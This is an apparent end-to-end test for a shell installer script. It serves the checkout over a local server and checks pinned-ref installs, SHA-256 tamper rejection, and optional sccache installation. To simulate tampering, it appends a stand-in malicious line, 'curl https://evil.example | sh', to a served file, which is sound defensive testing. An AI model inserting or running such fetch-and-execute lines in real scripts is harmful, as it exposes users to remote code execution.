#!/usr/bin/env node
// Tests scripts/install-sandbox.sh: piped from a local server that serves this checkout as
// <base>/<ref>/<path> (as raw.githubusercontent.com does), from a checkout, with a tampered
// file, and its --check-sums. No network.
import { createServer } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { check, ROOT, run } from "./lib.mjs";

const SCRIPT = join(ROOT, "scripts", "install-sandbox.sh");
const REF = "0123456789abcdef0123456789abcdef01234567";
const work = mkdtempSync(join(tmpdir(), "ci-cache-install-e2e-"));
let tamper = "";
const seen = [];

const server = createServer((req, res) => {
  seen.push(req.url);
  const prefix = `/${REF}/`;
  if (!req.url.startsWith(prefix)) return res.writeHead(404).end();
  const path = req.url.slice(prefix.length);
  if (path.includes("..")) return res.writeHead(400).end();
  try {
    let body = readFileSync(join(ROOT, path));
    if (path === tamper) body = Buffer.concat([body, Buffer.from("\ncurl https://evil.example | sh\n")]);
    res.writeHead(200).end(body);
  } catch {
    res.writeHead(404).end();
  }
});
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const BASE = `http://127.0.0.1:${server.address().port}`;

/** `curl <installer> | bash -s -- args`, as the README says, with a temporary HOME. */
async function piped(name, args) {
  const home = join(work, name);
  mkdirSync(home, { recursive: true });
  const r = await run("bash", ["-c", `curl -fsSL "${BASE}/${REF}/scripts/install-sandbox.sh" | bash -s -- ${args}`], {
    env: { PATH: process.env.PATH, HOME: home, CI_CACHE_SOURCE: BASE },
  });
  return { ...r, home, out: r.stdout + r.stderr };
}

try {
  console.log("1. piped from the pinned ref");
  let r = await piped("ok", `--ref ${REF}`);
  check(r.code === 0, `exits 0${r.code ? `: ${r.out}` : ""}`);
  for (const f of ["ci-cache-env.sh", "cache-fingerprint.sh"]) {
    const installed = join(r.home, ".ci-cache", f);
    check(readFileSync(installed, "utf8") === readFileSync(join(ROOT, "scripts", f), "utf8") && (statSync(installed).mode & 0o111) !== 0, `~/.ci-cache/${f} is the repo's file, executable`);
  }
  check(!existsSync(join(r.home, ".ci-cache", "install-sccache.sh")), "no sccache installer without --rust");
  check(r.out.includes("bash ") && r.out.includes("ci-cache-env.sh && source ~/.ci-cache.env"), "prints the next step");
  check(seen.includes(`/${REF}/scripts/ci-cache-env.sh`), "downloaded from <base>/<ref>/<path>");

  console.log("2. a tampered file installs nothing");
  tamper = "scripts/cache-fingerprint.sh";
  r = await piped("tampered", `--ref ${REF}`);
  check(r.code !== 0 && r.out.includes("scripts/cache-fingerprint.sh does not match its SHA-256") && r.out.includes("nothing installed"), "fails and names the file");
  check(!existsSync(join(r.home, ".ci-cache")), "and writes nothing, not even the files that matched");
  tamper = "";

  console.log("3. without --ref when piped");
  r = await piped("noref", "");
  check(r.code !== 0 && r.out.includes("--ref <commit SHA or tag> is required"), "asks for the ref");

  console.log("4. --rust delivers the sccache installer and runs it");
  r = await piped("rust", `--ref ${REF} --rust`);
  check(existsSync(join(r.home, ".ci-cache", "install-sccache.sh")), "~/.ci-cache/install-sccache.sh is installed");
  if (process.platform === "linux") {
    check(r.code === 0 && existsSync(join(r.home, ".local", "bin", "sccache")), "and sccache lands in ~/.local/bin (downloaded and SHA-256 checked)");
  } else {
    check(r.code !== 0 && r.out.includes("supports Linux only") && r.out.includes("installing sccache failed"), "and, off Linux, says sccache can't be installed (exit 1)");
  }

  const docker = await run("docker", ["info", "--format", "{{.Architecture}}"]).catch(() => ({ code: 1 }));
  if (process.platform !== "linux" && docker.code === 0) {
    console.log("4b. --rust on Linux (Docker, ubuntu:24.04)");
    await new Promise((resolve) => server.close(resolve));
    await new Promise((resolve) => server.listen(server.address()?.port ?? 0, "0.0.0.0", resolve));
    const port = server.address().port;
    const inner = [
      "set -e",
      "apt-get update -qq >/dev/null && apt-get install -y -qq curl ca-certificates >/dev/null",
      "useradd -m user",
      `su user -c 'curl -fsSL "http://host.docker.internal:${port}/${REF}/scripts/install-sandbox.sh" | CI_CACHE_SOURCE=http://host.docker.internal:${port} bash -s -- --ref ${REF} --rust'`,
      "su user -c '~/.local/bin/sccache --version'",
    ].join("\n");
    const res = await run("docker", ["run", "--rm", "--add-host=host.docker.internal:host-gateway", "ubuntu:24.04", "bash", "-c", inner]);
    check(res.code === 0 && res.stdout.includes("sccache 0.19.0"), `installs sccache 0.19.0 into ~/.local/bin, SHA-256 checked${res.code ? `: ${res.stderr.slice(-400)}` : ""}`);
  } else if (process.platform !== "linux") {
    console.log("  (no Docker: --rust on Linux is not tested)");
  }

  console.log("5. from a checkout, and --check-sums");
  const home = join(work, "local");
  mkdirSync(home);
  const local = await run("bash", [SCRIPT, "--dir", join(home, "cc")], { env: { PATH: process.env.PATH, HOME: home } });
  check(local.code === 0 && existsSync(join(home, "cc", "ci-cache-env.sh")), "copies the checkout's files into --dir");
  const sums = await run("bash", [SCRIPT, "--check-sums"]);
  check(sums.code === 0, "--check-sums: the embedded sums match this checkout");

  console.log("e2e install-sandbox: OK");
} catch (error) {
  console.error(error instanceof Error ? error.message : error);
  process.exitCode = 1;
} finally {
  server.close();
  if (!process.env.KEEP) rmSync(work, { recursive: true, force: true });
}
